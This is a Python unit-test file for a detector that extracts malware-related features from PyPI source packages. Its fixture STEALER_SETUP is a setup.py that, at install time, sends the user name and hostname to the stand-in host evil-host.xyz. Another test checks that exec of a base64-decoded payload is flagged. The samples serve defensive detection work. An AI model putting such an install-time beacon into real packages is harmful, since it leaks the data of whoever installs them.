"""Guards for the PyPI pipeline. Run from ml/: python -m unittest discover -s tests"""
import io
import sys
import tarfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "supplychain"))

import features_pypi as P  # noqa: E402


def sdist(files: dict) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo("pkg-1.0/" + name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


STEALER_SETUP = """
import os, socket, urllib.request
from setuptools import setup
def beacon():
    data = os.environ.get('USER') + socket.gethostname()
    urllib.request.urlopen('http://evil-host.xyz/c?d=' + data)
beacon()
setup(name='pkg', version='1.0')
"""

LEGIT_SETUP = """
from setuptools import setup, Extension
setup(name='pkg', version='1.0', description='A fast parser', author='Ann', license='MIT',
      url='https://github.com/ann/pkg', ext_modules=[Extension('fast', ['fast.c'])],
      install_requires=['requests>=2', 'numpy'])
"""


class PypiFeatureTests(unittest.TestCase):
    def test_pep503_name_normalisation(self):
        self.assertEqual(P.normalize_name("Django_REST.framework"), "django-rest-framework")
        self.assertEqual(P.normalize_name("a--b__c"), "a-b-c")

    def test_stealing_setup_py_is_detected_at_several_levels(self):
        f = P.content_features(sdist({"setup.py": STEALER_SETUP}), ".tgz", "1.0")
        self.assertEqual(f["has_install_script"], 1)
        self.assertGreaterEqual(f["hook_target_network"], 1)
        self.assertGreaterEqual(f["hook_target_env"], 1)
        self.assertGreaterEqual(f["hook_url_unknown_host"], 1)
        self.assertEqual(f["ast_source_and_sink_in_function"], 1)

    def test_legitimate_native_build_looks_legitimate(self):
        f = P.content_features(sdist({"setup.py": LEGIT_SETUP, "fast.c": "int x;", "LICENSE": "MIT",
                                      "README.md": "hi", "PKG-INFO": "Name: pkg\nVersion: 1.0\nSummary: A fast parser\n"}),
                               ".tgz", "1.0")
        self.assertEqual(f["hook_known_build_tool"], 1)
        self.assertEqual(f["hook_url_unknown_host"], 0)
        self.assertEqual(f["hook_target_network"], 0)
        self.assertEqual(f["has_install_script"], 0)  # no network/exec at install time
        self.assertEqual(f["md_has_pkg_info"], 1)
        self.assertEqual(f["has_license_file"], 1)

    def test_exec_of_decoded_payload_is_flagged(self):
        src = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
        f = P.python_ast_features([src])
        self.assertEqual(f["ast_exec_decoded_payload"], 1)
        self.assertEqual(f["ast_dynamic_eval"], 1)

    def test_dynamic_import_and_bad_syntax(self):
        f = P.python_ast_features(["m = 'o' + 's'\n__import__(m)\n"])
        self.assertEqual(f["ast_dynamic_require"], 1)
        self.assertEqual(P.python_ast_features(["def (((:"])["ast_parse_ok"], 0)

    def test_absurd_version_flag_is_shared_with_npm(self):
        f = P.content_features(sdist({"setup.py": LEGIT_SETUP}), ".tgz", "999.9.9")
        self.assertEqual(f["version_absurd_high"], 1)

    def test_package_without_setup_py_is_not_an_install_time_risk(self):
        f = P.content_features(sdist({"pyproject.toml": "[build-system]\nrequires=['setuptools']", "m.py": "x=1"}),
                               ".tgz", "1.0")
        self.assertEqual(f["has_install_script"], 0)
        self.assertEqual(f["md_has_setup_py"], 0)
        self.assertEqual(f["md_has_pyproject"], 1)


if __name__ == "__main__":
    unittest.main()
